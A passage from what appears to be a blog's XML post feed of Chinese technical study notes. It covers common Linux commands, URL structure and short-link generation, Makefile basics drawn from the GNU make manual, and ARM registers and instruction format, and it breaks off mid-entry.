L注意：该命令并不是真的清除了之前的信息，而是把之前的信息都隐藏到了最上面，可以通过滚动条继续查看以前的信息。 21.管道pipe管道符： |作用：管道一般可以用于“过滤”，“特殊”，“扩展处理” 语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用①过滤案例（高频率使用）：需要通过管道查询出根目录下包含“y”字母的文档名称。 12345#ls | grep y针对上面这个命令说明：①以管道作为分界线，前面的命令有个输出，后面需要先输入，然后再过滤，最后再输出，通俗的讲就是管道前面的输出就是后面指令的输入；②grep指令：主要用于过滤 ②特殊用法案例：通过管道的操作方法来实现less的等价效果（了解） 之前通过less查看一个文件，可以#less 路径 现在通过管道还可以这么：#cat 路径|less ③扩展处理：统计某个目录下的文档的总个数？ 答：#ls / | wc -l 22.hostname指令作用：操作服务器的主机名（读取or设置） 语法1：#hostname含义：表示输出完整的主机名 语法2：#hostname -f 含义：表示输出当前主机名中的FQDN（全限定域名） 23.id指令作用：查看一个用户的一些基本信息（包含用户id，用户组id，附加组id…），该指令如果不指定用户则默认当前用户。 语法1：#id默认显示当前执行该命令的用户的基本信息 语法2：#id username显示指定账户（username）的基本信息 验证用户信息可通过文件（/etc/passwd） 验证用户组信息可通过文件（/etv/group） 24.whoami指令作用：“我是谁？”，显示当前登录的用户名，一般用于shell脚本，用于获取当前操作系统的用户名方便记录日志。 语法：#whoami 25.ps -ef指令指令：ps 作用：用于查看服务器进程信息 选项含义： ​ -e：等价于“-A”，表示列出全部的进程 ​ -f：显示全部的列（显示全字段） 12345678910各列的含义：UID：该进程执行的用户id；PID：进程id；PPID：该进程的父级进程id，如果一个程序的父级进程找不到，该程序的进程称之为僵尸进程（parent process ID）；C：Cpu的占用率，其形式是百分数；STIME：进行的启动时间；TTY：终端设备，发起该进程的设备识别符号，如果显示“?”则表示该进程并不是由终端设备发起；TIME：进程的执行时间；CMD：该进程的名称或者对应的路径 #ps -ef | grep “进程名称”用于查看特定进程的状态 26.top指令作用：查看服务器的进程占用的资源 语法：进入命令：#top（动态显示）退出命令：按下q键 12345678910111213表头含义：PID：进程id；USER：该进程对应的用户；PR：优先级；VIRT：虚拟内存；RES：常驻内存；SHR：共享内存；4计算一个进程实际使用的内存 = 常驻内存（RES）- 共享内存（SHR）S：表示进程的状态status（sleeping，其中S表示睡眠，R表示运行）；%CPU：表示CPU的占用百分比；%MEM：表示内存的占用百分比；TIME+：执行的时间；COMMAND：进程的名称或者路径 在运行top命令时，可以有如下快捷键： M：表示将结果按照内存（MEM）从高到低进行降序排列 P：表示将结果按照CPU使用率从高到低进行降序排列 1：当服务器拥有多个CPU的时候可以使用“1”快捷键来切换是否展示显示各个cpu的详细信息 27.du -sh指令作用：查看目录的真实大小 语法：#du -sh 目录路径选项含义： ​ -s：summaries，只显示汇总的大小 ​ -h：表示以高可读性的形式进行显示 28.find指令作用：用于查找文件（参数贼多，55个） 语法：#find 路径范围 选项 选项的值选项： ​ -name：按照文件名称进行搜索（支持模糊搜索） ​ -type：按照文件的类型进行搜索（文件类型：“-”表示文件，在使用find的使用需要用f来替换；“d”表示文件夹） 注：*为通配符，匹配所有字符 29.service指令作用：用于控制一些软件的服务启动、停止、重启 语法：#service 服务名 start/stop/restart例：启动本机安装的Apache，其服务名为httpd 其服务启动规则可自己编写，后续将会专门开一篇讲述 30.kill指令作用：表示杀死进程（当遇到僵尸进程或者处于某些原因需要关闭进程的时候） 语法：#kill 进程的PID（需要配合ps一起使用） 与kill相似的命令：#killall 语法：#killall 进程名称 31.ifconfig指令作用：用于操作网卡相关的指令 语法：#ifconfig（获取网卡信息） 注意该命令在windows环境下为ipconfig Eth0表示Linux中的一个网卡，eth0是其名称。Lo（loop，本地回还网卡，其ip地址一般都是127.0.0.1）也是一个网卡名称。注意：inet addr就是网卡的ip地址。 32.reboot指令作用：重启计算机 语法1：#reboot重启 语法2：#reboot -w模拟重启，但是不重启（只写关机与开机的日志信息） 33.shutdown指令作用：关机（慎用） 语法1：#shutdown -h now “关机提示”#shutdown -h time(14:41) “关机提示” 如果想要取消关机计划的话，则可以按照以下方式去尝试： ①针对于centos7.x之前的版本：ctrl+c ②针对于centos7.x（包含）之后的版本：#shutdown -c 除了shutdown关机以外，还有以下几个关机命令 #init 0 #halt #poweroff 34.uptime指令作用：输出计算机的持续在线时间（计算机从开机到现在运行的时间） 语法：#uptime 35.uname指令作用：获取计算机操作系统的相关信息 语法1：#uname获取操作系统类型 语法2：#uname -a-a：表示all，表示获取全部的系统信息（类型、全部主机名、内核版本、发布时间、开源计划） 36.netstat -tnlp指令作用：查看网络连接状态 语法：#netstat -tnlp 12345选项说明：4-t：表示只列出tcp协议的连接；4-n：表示将地址从字母组合转化成ip地址，将协议转化成端口号来显示；4-l：表示过滤出“state（状态）”列中其值为LISTEN（监听）的连接；4-p：表示显示发起连接的进程pid和进程名称； 37.man指令作用：manual，手册（包含了Linux中全部的命令手册，英文） 语法：#man 命令退出按下q键 例：#man cp 编辑器之神——Vim编辑器]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[url]]></title>
    <url>%2F2019%2F08%2F19%2Furl%2F</url>
    <content type="text"><![CDATA[URL 引用： url_Wiki) 短链接原理分析 短链接的算法 统一资源定位符（英语：Uniform Resource Locator）统一资源定位符（英语：Uniform Resource Locator，缩写：URL；或称统一资源定位器、定位地址、URL地址，俗称网页地址或简称网址）是因特网上标准的资源的地址（Address），如同在网络上的门牌。它最初是由蒂姆·伯纳斯-李发明用来作为万维网的地址，现在它已经被[万维网联盟4编制为因特网标准RFC 1738。 在互联网的历史上，统一资源定位符的发明是一个非常基础的步骤。统一资源定位符的语法是一般的，可扩展的，它使用美国信息交换标准代码的一部分来表示因特网的地址。统一资源定位符的开始，一般会标志着一个计算机网络所使用的网络协议。 统一资源定位符的标准格式如下： 12[协议类型]: //服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID[protocol]://server_address:port/path_and_filename?search#fragmentID 统一资源定位符的完整格式如下： 1[协议类型]: //访问资源需要的凭证信息@服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID 其中[访问凭证信息]、[端口号]、[查询]、[片段ID]都属于选填项。 语法超文本传输协议（http）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中： 传送协议。 层级URL标记符号(为[//],固定不变) 访问资源需要的凭证信息（可省略） 服务器。（通常为域名，有时为IP地址） 端口号。（以数字方式表示，若为默认值可省略） 路径。（以“/”字符区别路径中的每一个目录名称） 查询。（GET模式的窗体参数，以“?”字符为起点，每个参数以“&amp;”隔开，再以“=”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题） 片段。以“#”字符为起点 以http://zh.wikipedia.org:80/w/index.php?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2 为例, 其中： http，是协议； zh.wikipedia.org，是服务器； 80，是服务器上的网络端口号； /w/index.php，是路径； ?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2，是询问。 大多数网页浏览器不要求用户输入网页中“http://”的部分，因为绝大多数网页内容是超文本传输协议文件。同样，“80”是超文本传输协议文件的常用端口号，因此一般也不必写明。一般来说用户只要键入统一资源定位符的一部分（zh.wikipedia.org/wiki/Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2）就可以了。 由于超文本传输协议允许服务器将浏览器重定向到另一个网页地址，因此许多服务器允许用户省略网页地址中的部分，比如 www。从技术上来说这样省略后的网页地址实际上是一个不同的网页地址，浏览器本身无法决定这个新地址是否通，服务器必须完成重定向的任务 短链接短链接本质上是http协议中的重定向内容，一般为http301和http302 短链接的优势：简短、美观、便于传播 原理例如短链接 http://qnr.io/j6Dcss DNS解析qnr.io域名，发送GET请求 /j6Dcss 服务器会通过短码获取对应的原URL 然后通过 HTTP 302 （或HTTP 301）转到对应的原URL 常见算法实现自增序列算法短址的长度一般设为 6 位，而每一位是由 [a - z, A - Z, 0 - 9] 总共 62 个字母组成的，所以 6 位的话，总共会有 62^6 ~= 568亿种组合，一般肯定是够用了。将原网址分配一个从1位到6位的随机短码，存数据库记录，对返回的id进行62进制转码。 即可使用发号策略。发号策略是这样的，当一个新的链接过来时，发号器发一个号与之对应。往后只要有新链接过来，发号器不停发号就好。举个例子，第一个进来的链接发号器发0号，对应的短链接为 xx.xxx/0，第二个进来的链接发号器发1号，对应的短链接为 xx.xxx/1，以此类推。发号器发出的10进制号需要转换成62进制，这样可以大大缩短号码转换成字符串后的长度。比如发号器发出 10,000,000,000 这个号码，如果不转换成62进制，直接拼接在域名后面，得到这样一个链接 xx.xxx/10000000000。将上面的号码转换成62进制，结果为AOYKUa，长度只有6位，拼接得到的链接为 xx.xxx/AOYKUa。可以看得出，进制转换后得到的短链接长度变短了一些。6位62进制数，对应的号码空间为626，约等于568亿。也就是说发号器可以发568亿个号，这个号码空间应该能够满足多数项目的需求了，所以基本上不用担心发号器无号可发的情况。上述是发号策略压缩URL的原理，在实际写代码的过程中还需要考虑很多细节，比如缓存，存储等。 摘要算法将原网址 md5 生成 32 位签名串,分为 4 段, 每段 8 个字节对这四段循环处理, 取 8 个字节, 将他看成 16 进制串与0x3fffffff(30位1) 与操作, 即超过 30 位的忽略处理 这 30 位分成 6 段, 每 5位的数字作为字母表的索引取得特定字符, 依次进行获得 6 位字符串总的 md5 串可以获得 4 个 6位串,取里面的任意一个就可作为这个长 url 的短 url 地址 这种算法,虽然会生成4个,但是仍然存在重复几率 算法比较第一种算法的好处就是简单好理解，永不重复。但是短码的长度不固定，随着 id 变大从一位长度开始递增。如果非要让短码长度固定也可以就是让 id 从指定的数字开始递增就可以了。 第二种算法，虽然几率很小，但是存在碰撞（重复）的可能性。短码位数是比较固定的。 Q：同一长链接，每次转成的短链接是否一样A：同一长链接，每次转成的短链接不一定一样，原因在于如果查询缓存时，如果未命中，发号器会发新号给这个链接。需要说明的是，缓存应该缓存经常转换的热门链接，假设设定缓存过期时间为一小时，如果某个链接很活跃的话，缓存查询命中后，缓存会刷新这个链接的存活时间，重新计时，这个链接就会长久存在缓存中。对于一些生僻链接，从存入缓存开始，在存活时间内很可能不会被再次访问，存活时间结束缓存会删除记录。下一次转换这个生僻链接，缓存不命中，发号器会重新发号。这样一来会导致一条长链接对应多条短链接的情况出现，不仅浪费存储空间，又浪费发号器资源。那么是否有办法解决这个问题呢？是不是可以考虑建立一个长链接-短链接的key-value表，将所有的长链接和对应的短链接都存入其中，这样一来就实现了长短链接一一对应的了。但是想法是美好的，现实是不行的，原因在于，将所有的长链接-短链接对存入这样的表中，本身就需要耗费大量的存储空间，相对于生僻链接可能会对应多条短链接浪费的那点空间，这样做显然就得不偿失了。 HTTP 301与 302的区别301 是永久重定向，302 是临时重定向。短地址一经生成就不会变化，所以用 301 是符合 http 语义的。同时对服务器压力也会有一定减少。用户第一次访问某个短链接后，如果服务器返回301状态码，则这个用户在后续多次访问统一短链接，浏览器会直接请求跳转地址，而不是短链接地址，这样一来服务器端就无法收到用户的请求。如果服务器返回302状态码，且告知浏览器不缓存短链接请求，那么用户每次访问短链接，都会先去短链接服务端取回长链接地址，然后在跳转。从语义上来说，301跳转更为合适，因为是永久跳转，不会每次都访问服务端，还可以减小服务端压力。但如果使用301跳转，服务端就无法精确搜集用户的访问行为了。相反302跳转会导致服务端压力增大，但服务端此时就可精确搜集用户的访问行为。但是如果使用了 301，我们就无法统计到短地址被点击的次数了。而点收集击次数的意义那就不言而喻了，关键是现在服务器硬件设备都很好，还有支持高并发的NGINX，所以对服务器的压力几乎可以忽略，最终也就选择302。]]></content>
      <tags>
        <tag>url</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Makefile]]></title>
    <url>%2F2019%2F06%2F06%2FMakefile%2F</url>
    <content type="text"><![CDATA[Make 本文参考： GNU+make中文手册 GNU+make原版官方手册 make wiki Makefile由浅入深 跟我一起写Makefile 序​ 最初了解到Makefile，还是从很久很久以前说起。当时在老师底下做项目，要配置一个nginx服务器，当初给出教程是直接make&amp;&amp;make install就完事了，打完代码一行行执行下来看起来非常有成就感233333 ​ 但是之后在做计算机系统的实验时，才发现Makefile是如此的有用万能，无论是windows还是linux(ubuntu 16.04)下，只需要一个make就能解决编译链接安装问题，make完就能立即使用，实属好用。在之后的操作系统实验中，真正接触到了Makefile这东西，基本每个实验都要写Makefile，因此对Makefile的格式有了一个大概印象，但不过想深入了解一波，便去找了许多资料看。 概述在软件开发中，make是一个工具程序（Utility software），经由读取叫做“makefile”的文件，自动化建构软件。它是一种转化文件形式的工具，转换的目标称为“target”；与此同时，它也检查文件的依赖关系，如果需要的话，它会调用一些外部软件来完成任务。它的依赖关系检查系统非常简单，主要根据依赖文件的修改时间进行判断。大多数情况下，它被用来编译源代码，生成结果代码，然后把结果代码连接起来生成可执行文件或者库文件。它使用叫做“makefile”的文件来确定一个target文件的依赖关系，然后把生成这个target的相关命令传给shell去执行。 许多现代软件的开发中（如Microsoft Visual Studio（他其实有提供一个vs 2017 交叉工具命令提示符，可以进行make，但不过一般在IDE中直接编译生成独有的工程配置文件）），集成开发环境已经取代make，但是在Unix环境中，仍然有许多任务程师采用make来协助软件开发。 Makefile介绍make命令执行时，需要一个makefile文件，以告诉make命令需要怎么样的去编译和链接程序。 首先，我们用一个示例来说明makefile的书写规则，以便给大家一个感性认识。这个示例来源于gnu 的make使用手册，在这个示例中，我们的工程有8个c文件，和3个头文件，我们要写一个makefile来告 诉make命令如何编译和链接这几个文件。我们的规则是： 如果这个工程没有编译过，那么我们的所有c文件都要编译并被链接。 如果这个工程的某几个c文件被修改，那么我们只编译被修改的c文件，并链接目标程序。 如果这个工程的头文件被改变了，那么我们需要编译引用了这几个头文件的c文件，并链接目标程序。 只要我们的makefile写得够好，所有的这一切，我们只用一个make命令就可以完成，make命令会自动智能 地根据当前的文件修改的情况来确定哪些文件需要重编译，从而自动编译所需要的文件和链接目标程序。 Makefile规则12345678#Makefile中，用#表示注释target ...: prerequisites ...4command 14#注意命令前要用Tab4command 24...4...#可以使用“\”表示续行，但是“\”之后不能有空格 target 可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。对 于标签这种特性，在后续的“伪目标”章节中会有叙述。 prerequisites 生成该target所依赖的文件和/或target command 该target要执行的命令（任意的shell命令） 这是一个文件的依赖关系，也就是说，target这一个或多个的目标文件依赖于prerequisites中的文件， 其生成规则定义在command中。说白一点就是说: prerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。 这就是Makefile中最核心的规则。 实例采用GNU make 手册中的例子 123456789101112131415161718192021222324edit : main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \ insert.o search.o files.o utils.omain.o : main.c defs.h cc -c main.ckbd.o : kbd.c defs.h command.h cc -c kbd.ccommand.o : command.c defs.h command.h cc -c command.cdisplay.o : display.c defs.h buffer.h cc -c display.cinsert.o : insert.c defs.h buffer.h cc -c insert.csearch.o : search.c defs.h buffer.h cc -c search.cfiles.o : files.c defs.h buffer.h command.h cc -c files.cutils.o : utils.c defs.h cc -c utils.cclean : rm edit main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o 该工程有3个头文件和8个c文件 其中反斜杠(“\”)是换行符，注意换行符之后不能用空格。换行符又利用Makefile的阅读。 把Makefile放在处于工程下的，然后在该目录下输入make命令，就可以生成可执行文件了。如果要删除执行文件和所有的中间目标文件，那么只需要执行make clean就可以了。 在这个makefile中，目标文件（target）包含：执行文件edit和中间目标文件（ *.o ），依赖文 件（prerequisites）就是冒号后面的那些 .c 文件和 .h 文件。每一个 .o 文件都有 一组依赖文件，而这些 .o 文件又是执行文件 edit 的依赖文件。依赖关系的实质就是说明了目 标文件是由哪些文件生成的，换言之，目标文件是哪些文件更新的。 这里要说明一点的是， clean 不是一个文件，它只不过是一个动作名字，有点像c语言中的label一 样，其冒号后什么也没有，那么，make就不会自动去找它的依赖性，也就不会自动执行其后所定义的命令。 要执行其后的命令，就要在make命令后明显得指出这个label的名字。这样的方法非常有用，我们可以在一 个makefile中定义不用的编译或是和编译无关的命令，比如程序的打包，程序的备份，等等。 make的执行过程如下： 依次读取变量“MAKEFILES”定义的makefile文件列表 读取工作目录下的makefile文件（GNU make的顺序：缺省的是根据命名的查找顺序“GNUmakefile”，“makefile”，“Makefile”，首先找到那个就读取那个（假如是MAKEFILE，需要用make -f）） 依次读取工作目录makefile文件中使用指示符“include”包含的文件 查找重建所有已读取的makefile文件的规则（如果存在一个目标是当前读取的某一个makefile文件，则执行此规则重建此makefile文件，完成以后从第一步开始重新执行） 初始化变量值并展开那些需要立即展开的变量和函数并根据预设条件确定执行分支 根据“终极目标”以及其他目标的依赖关系建立依赖关系链表 执行除“终极目标”以外的所有的目标的规则（规则中如果依赖文件中任一个文件的时间戳比目标文件新，则使用规则所定义的命令重建目标文件） 执行“终极目标”所在的规则 一上面那个工程为示例： 1234567891011在默认的方式下，也就是我们只输入 make 命令。那么，1.make会在当前目录下找名字叫“Makefile”或“makefile”的文件。2.如果找到，它会找文件中的第一个目标文件（target），在上面的例子中，他会找到“edit”这个 文件，并把这个文件作为最终的目标文件。3.如果edit文件不存在，或是edit所依赖的后面的 .o 文件的文件修改时间要比 edit 这个 文件新，那么，他就会执行后面所定义的命令来生成 edit 这个文件。4.如果 edit 所依赖的 .o 文件也不存在，那么make会在当前文件中找目标为 .o 文件 的依赖性，如果找到则再根据那一个规则生成 .o 文件。（这有点像一个堆栈的过程）5.当然，你的C文件和H文件是存在的啦，于是make会生成 .o 文件，然后再用 .o 文件生 成make的终极任务，也就是执行文件 edit 了。 这就是整个make的依赖性，make会一层又一层地去找文件的依赖关系，直到最终编译出第一个目标文件。在 找寻的过程中，如果出现错误，比如最后被依赖的文件找不到，那么make就会直接退出，并报错，而对于所定义的命令的错误，或是编译不成功，make根本不理。make只管文件的依赖性。 像 clean 这种，没有被第一个目标文件直接或间接关联，那么它后面所定义的命 令将不会被自动执行，不过，我们可以显示要make执行。即命令—— make clean ，以此来清除所有 的目标文件，以便重编译。 如果这个工程已被编译过了，当我们修改了其中一个源文件，比如 file.c ， 那么根据我们的依赖性，我们的目标 file.o 会被重编译（也就是在这个依性关系后面所定义的命令）， 于是 file.o 的文件也是最新的啦，于是 file.o 的文件修改时间要比 edit 要新，所 以 edit 也会被重新链接了（详见 edit 目标文件后定义的命令）。比如我们改变了 command.h ，那么， kdb.o 、 command.o 和 files.o 都 会被重编译，并且， edit 会被重链接。 Makefile中使用变量总所周知，变量是个好东西0.0 在Makefile中使用变量有利于我们对其有更好的维护性。 跟通常编程一样，变量名最好简(jian)洁(dan)易(cu)懂(bao)，有利于人们明白其代表的含义。 在上面例子中，edit后面的一串便可以进行替代了。 1234edit : main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o 当我们需要添加文件时，需要修改多个地方，使用变量能很好地为我们节省时间。 只需在前面声明变量就好，比如objects，objs，obj等等，只要能很好明白其代表的含义就行 1234567891011121314151617181920212223objs = main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o edit : $(objs) cc -o edit $(objs)main.o : main.c defs.h cc -c main.ckbd.o : kbd.c defs.h command.h cc -c kbd.ccommand.o : command.c defs.h command.h cc -c command.cdisplay.o : display.c defs.h buffer.h cc -c display.cinsert.o : insert.c defs.h buffer.h cc -c insert.csearch.o : search.c defs.h buffer.h cc -c search.cfiles.o : files.c defs.h buffer.h command.h cc -c files.cutils.o : utils.c defs.h cc -c utils.cclean : rm edit $(objs) 比如这样，当我们需要添加新的 .o 文件的时候，只需要修改objs = ...就行了 Makefile的自动推导GNU的make可以自动推到文件及文件依赖关系后面的命令，于是我们就没必要去在每一个 .o 文件后都写上类似的命令，因为，我们的make会自动识别，并自己推导命令。 只要make看到一个 .o 文件，它就会自动的把 .c 文件加在依赖关系中，如果make找到一个whatever.o ，那么 whatever.c 就会是 whatever.o 的依赖文件。并且 cc -c whatever.c 也会被推导出来，于是，我们的makefile再也不用写得这么复杂。我们的 新makefile又出炉了。 123456789101112131415161718objects = main.o kbd.o command.o display.o \ insert.o search.o files.o utils.oedit : $(objects) cc -o edit $(objects)main.o : defs.hkbd.o : defs.h command.hcommand.o : defs.h command.hdisplay.o : defs.h buffer.hinsert.o : defs.h buffer.hsearch.o : defs.h buffer.hfiles.o : defs.h buffer.h command.hutils.o : defs.h.PHONY : cleanclean : rm edit $(objects) 这种方法，也就是make的“隐晦规则”。 .PHONY 表示 clean 是个伪目标 文件。 另类风格的Makefile既然我们的make可以自动推导命令，那么我看到那堆 .o 和 .h 的依赖就有点不爽，那么多的 重复的 .h ，能不能把其收拢起来，好吧，没有问题，这个对于make来说很容易，谁叫它提供了自动 推导命令和文件的功能呢？来看看最新风格的makefile吧。 12345678910111213objects = main.o kbd.o command.o display.o \ insert.o search.o files.o utils.oedit : $(objects) cc -o edit $(objects)$(objects) : defs.hkbd.o command.o files.o : command.hdisplay.o insert.o search.o files.o : buffer.h.PHONY : cleanclean : rm edit $(objects) 清空目标文件的规则每个Makefile中都应该写一个清空目标文件（ .o 和执行文件）的规则，这不仅便于重编译，也很 利于保持文件的清洁。 12clean: rm edit $(objects) 更为稳健的做法是： 123.PHONY : cleanclean : -rm edit $(objects) 前面说过， .PHONY 表示 clean 是一个“伪目标”。而在 rm 命令前面加了一个小减号的 意思就是，也许某些文件出现问题，但不要管，继续做后面的事。当然， clean 的规则不要放在文件 的开头，不然，这就会变成make的默认目标，相信谁也不愿意这样。不成文的规矩是——“clean从来都是放 在文件的最后”。 Makefile里有什么？Makefile里主要包含了五个东西：显式规则、隐晦规则、变量定义、文件指示和注释。 显式规则。显式规则说明了如何生成一个或多个目标文件。这是由Makefile的书写者明显指出要生成的 文件、文件的依赖文件和生成的命令。 隐晦规则。由于我们的make有自动推导的功能，所以隐晦的规则可以让我们比较简略地书写 Makefile，这是由make所支持的。 变量的定义。在Makefile中我们要定义一系列的变量，变量一般都是字符串，这个有点像你C语言中的 宏，当Makefile被执行时，其中的变量都会被扩展到相应的引用位置上。 文件指示。其包括了三个部分，一个是在一个Makefile中引用另一个Makefile，就像C语言中 的include一样；另一个是指根据某些情况指定Makefile中的有效部分，就像C语言中的预编译#if一 样；还有就是定义一个多行的命令。有关这一部分的内容，我会在后续的部分中讲述。 注释。Makefile中只有行注释，和UNIX的Shell脚本一样，其注释是用 # 字符，这个就 像C/C++中的 // 一样。如果你要在你的Makefile中使用 # 字符，可以用反斜杠进行转义，如： \# 。 还有的就是在Makefile中的命令，必须要以 Tab 键开始。 Makefile的文件名因为make程序已被用户多次重/改写，其中包括几次用相同的文件格式和算法原理重新编写，并且依照不同需要添加了一些不常见的改良。 现在的版本，大致是 GNU make，BSD make，Microsoft nmake。 默认的情况下，gnu的make命令会在当前目录下按顺序找寻文件名为“GNUmakefile”、 “makefile”、“Makefile”的文件，找到了解释这个文件。在这三个文件名中，最好使用“Makefile” 这个文件名，因为，这个文件名第一个字符为大写，这样有一种显目的感觉。最好不要用“GNUmakefile”， 这个文件是GNU的make识别的。有另外一些make只对全小写的“makefile”文件名敏感，但是基本上来说， 大多数的make都支持“makefile”和“Makefile”这两种默认文件名。 当然，你可以使用别的文件名来书写Makefile，比如：“Make.Linux”，“Make.Solaris” ，“Make.AIX”等，如果要指定特定的Makefile，你可以使用make的 -f 和 --file 参数， 如： make -f Make.Linux 或 make --file Make.AIX 。 引用其他的Makefile在Makefile使用 include 关键字可以把别的Makefile包含进来，这很像C语言的 #include ，被包含的文件会原模原样的放在当前文件的包含位置。 include 的语法是： 1include &lt;filename&gt; filename 可以是当前操作系统Shell的文件模式（可以包含路径和通配符）。 在 include 前面可以有一些空字符，但是绝不能是 Tab 键开始。 include 和 &lt;filename&gt; 可以用一个或多个空格隔开。举个例子，你有这样几个Makefile： a.mk 、 b.mk 、 c.mk ，还有一个文件叫 foo.make ，以及一个变量 $(bar) ，其包含 了 e.mk 和 f.mk ，那么，下面的语句： 12bar = e.mk f.mkinclude foo.make *.mk $(bar) 等价于： 1include foo.make a.mk b.mk c.mk e.mk f.mk make命令开始时，会找寻 include 所指出的其它Makefile，并把其内容安置在当前的位置。就好 像C/C++的 #include 指令一样。如果文件都没有指定绝对路径或是相对路径的话，make会在当前目 录下首先寻找，如果当前目录下没有找到，那么，make还会在下面的几个目录下找： 如果make执行时，有 -I 或 --include-dir 参数，那么make就会在这个参数所指定的目 录下去寻找。 如果目录 &lt;prefix&gt;/include （一般是： /usr/local/bin 或 /usr/include ）存在的话，make也会去找。 如果有文件没有找到的话，make会生成一条警告信息，但不会马上出现致命错误。它会继续载入其它的 文件，一旦完成makefile的读取，make会再重试这些没有找到，或是不能读取的文件，如果还是 不行，make才会出现一条致命信息。如果你想让make不理那些无法读取的文件，而继续执行，你可以 在include前加一个减号“-”。如： 1-include &lt;filename&gt; 其表示，无论include过程中出现什么错误，都不要报错继续执行。和其它版本make兼容的相关命令 是sinclude，其作用和这一个是一样的。 环境变量MAKEFILES如果你的当前环境中定义了环境变量 MAKEFILES ，那么，make会把这个变量中的值做一个类似于include 的动作。这个变量中的值是其它的Makefile，用空格分隔。只是，它和 include 不 同的是，从这个环境变量中引入的Makefile的“目标”不会起作用，如果环境变量中定义的文件发现 错误，make也会不理。 但是在这里我还是建议不要使用这个环境变量，因为只要这个变量一被定义，那么当你使用make时， 所有的Makefile都会受到它的影响，这绝不是你想看到的。在这里提这个事，只是为了告诉大家，也许 有时候你的Makefile出现了怪事，那么你可以看看当前环境中有没有定义这个变量。 make的工作流程GNU的make工作时的执行步骤如下：（想来其它的make也是类似） 读入所有的Makefile。 读入被include的其它Makefile。 初始化文件中的变量。 推导隐晦规则，并分析所有规则。 为所有的目标文件创建依赖关系链。 根据依赖关系，决定哪些目标要重新生成。 执行生成命令。 1-5步为第一个阶段，6-7为第二个阶段。第一个阶段中，如果定义的变量被使用了，那么，make会把其展 开在使用的位置。但make并不会完全马上展开，make使用的是拖延战术，如果变量出现在依赖关系的规则 中，那么仅当这条依赖被决定要使用了，变量才会在其内部展开。 当然，这个工作方式你不一定要清楚，但是知道这个方式你也会对make更为熟悉。有了这个基础，后续部分 也就容易看懂了。 书写规则]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>make</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPFS]]></title>
    <url>%2F2019%2F05%2F30%2FIPFS%2F</url>
    <content type="text"></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARM]]></title>
    <url>%2F2019%2F05%2F28%2FARM%2F</url>
    <content type="text"><![CDATA[ARM指令集详解 引用： ARM指令集详解 1. 汇编1.1. 通用寄存器 寄存器类别 寄存器在汇编中的名称 各模式下实际访问的寄存器 用户 系统 管理 中止 未定义 中断 快中断 通用寄存器和程序计数器 R0(a1) R0 R1(a2) R1 R2(a3) R2 R3(a4) R3 R4(v1) R4 R5(v2) R5 R6(v3) R6 R7(v4) R7 R8(v5) R8 R8_fiq R9(SB,v6) R9 R9_fiq R10(SL,v7) R10 R10_fiq R11(FP,v8) R11 R11_fiq R12(IP) R12 R12_fiq R13(SP) R13 R13_svc R13_abt R13_und R13_irq R13_fiq R14(LR) R14 R14_svc R14_abt R14_und R14_irq R14_fiq * R15(PC) R15 状态寄存器 R16(CPSR) CPSR SPSR 无 SPSR_svc SPSR_abt SPSR_und SPSR_irq SPSR_fiq 通用寄存器 37个寄存器，31个通用寄存器，6个状态寄存器。 R12是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。在过程调用之间，可以将它用于任何用途。被调用函数在返回之前不必恢复 r12。 R13堆栈指针sp，R14返回指针，R15为PC指针, cpsr_c代表的是这32位中的低8位，也就是控制位 CPSR有4个8位区域：标志域（F）、状态域（S）、扩展域（X）、控制域（C）MSR - Load specified fields of the CPSR or SPSR with an immediate constant, orfrom the contents of a general-purpose register. Syntax: MSR{cond} _, #immed_8rMSR{cond} _, Rm where: cond is an optional condition code. is either CPSR orSPSR. specifies the field or fields to be moved. can be one or more of: ccontrol field mask byte (PSR[7:0]) x extension field mask byte (PSR[15:8]) sstatus field mask byte (PSR[23:16) f flags field mask byte (PSR[31:24]).immed_8r is an expression evaluating to a numeric constant. The constant mustcorrespond to an 8-bit pattern rotated by an even number of bits within a32-bit word. Rm is the source register. C 控制域屏蔽字节(psr[7:0]) X 扩展域屏蔽字节(psr[15:8]) S 状态域屏蔽字节(psr[23:16]) F 标志域屏蔽字节(psr[31:24]) CPSR寄存器 FIQ和IRQ的区别？ MODE(以下为二进制) 可见的ARM状态寄存器 10000 用户模式 PC,CPSR,R0~R14 10001 FIQ PC,CPSR,SPSR_fiq，R14_fiq~R8_fiq,R7~R0 10010 IRQ PC,CPSR,SPSR_irq，R14_irq~R13_irq,R12~R0 10011 管理模式(svc) PC,CPSR,SPSR_svc，R14_svc~R13_svc,R12~R0 10111 终止模式 PC,CPSR,SPSR_abt，R14_abt~R13_abt,R12~R0 11011 未定义 PC,CPSR,SPSR_und，R14_und~R13_und,R2~R0 11111 系统模式(sys) PC,CPSR，R14 ~R0 1.2. 指令格式1) 基本格式 ​ &lt;opcode&gt;{&lt;cond&gt;}{S} &lt;Rd&gt;,&lt;Rn&gt;{,&lt;opcode2&gt;} ​ 其中，&lt;&gt;内的项是必须的，{}内的项是可选的，如是指令助记符，是必须的，而{}为指令执行条件，是可选的，如果不写则使用默认条件AL(无条件执行)。 ​ opcode 指令助记符，如LDR，STR 等 ​ cond 